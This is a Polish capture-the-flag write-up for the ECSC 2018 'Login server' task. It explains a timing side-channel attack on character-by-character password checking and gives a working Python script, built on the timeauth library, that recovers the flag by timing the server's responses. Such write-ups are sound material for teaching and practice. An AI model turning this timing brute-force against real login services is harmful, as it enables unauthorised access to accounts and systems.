# Login server
##### misc
##### Punkty: 300
##### Rozwiązań: 13


>There is a mysterious service that I have no idea how to hack.
Update 2018-06-19 12:30:
There is a mysterious service that I have no time to hack.
We have also changed the password. Now it's the flag.
nc ecsc18.hack.cert.pl 10013
---

Pod podanym adresem serwer prosi o podanie hasła. Z opisu zadania możemy przypuszczać, że algorytm sprawdzający hasło podatny jest na time attack. W najprostszym przypadku oznacza to, że istnieje korelacja między długością poprawnego prefiksu podanego hasła a czasem odpowiedzi od serwera.
Na przykład hasło sprawdzane jest znak po znaku, a przy pierwszym niepoprawym znaku wysyłana jest informacja o niepoprawnym haśle.
```bash
➜  ~ nc ecsc18.hack.cert.pl 10013
AWSUM Login Server(tm)
Please enter password: admin1
Invalid password!
dupa.8
Invalid password!
^C% 
```

Z taką wiedzą możemy mieżyć czas odpowiedzi na ciągi skonstruowane w następujący sposób:
`[poprawny_prefiks][zgadywany_znak]`.
Dla jednego z ciągów czas odpowiedzi powinien być dłuższy. Oznacza to, że ten ciąg jest poprawnym prefiksem prawidłowego hasła.

Ostateczne rozwiązanie bazowało na lekko zmodyfikowanym kodzie z repozytorium `https://github.com/SakiiR/timeauth`. 
Wystarczyło zaimplementować odpowiednią klasę.

```python
class ExampleChecker(TimeAuthChecker):

    def __init__(self, host, port, length, charset_in, base):
        super(self.__class__, self).__init__(
            charset=charset_in,
            token_length=length,
            hidden_char="*",
            base_token=base
        )

        self.r = remote(host, port)
        self.r.recvuntil(': ')
        self.r.sendline('a') 
        self.r.recvline()
        print("connected")

    def request(self):
        self.r.sendline(self.get_token())
        response = self.r.recvline()
        if 'Invalid' not in response:
            print(response)

if __name__ == "__main__":
    host = "ecsc18.hack.cert.pl"
    port = 10013
    length = 32
    base = "ecsc{"
    charset = string.printable
    a = ExampleChecker(host, port, length, charset, base)
    a.process()
    a.print_token()
```
Aby zmaksymalizować szansę powodzenia ataku należało zadbać o stabilność pomiarów czasu, czyli o stabilność łącza. Atak należało przeprowadzić z serwera jak nabliżej atakowanego serwera. Po spełnieniu tego warunku zadanie nie stawiało oporu.
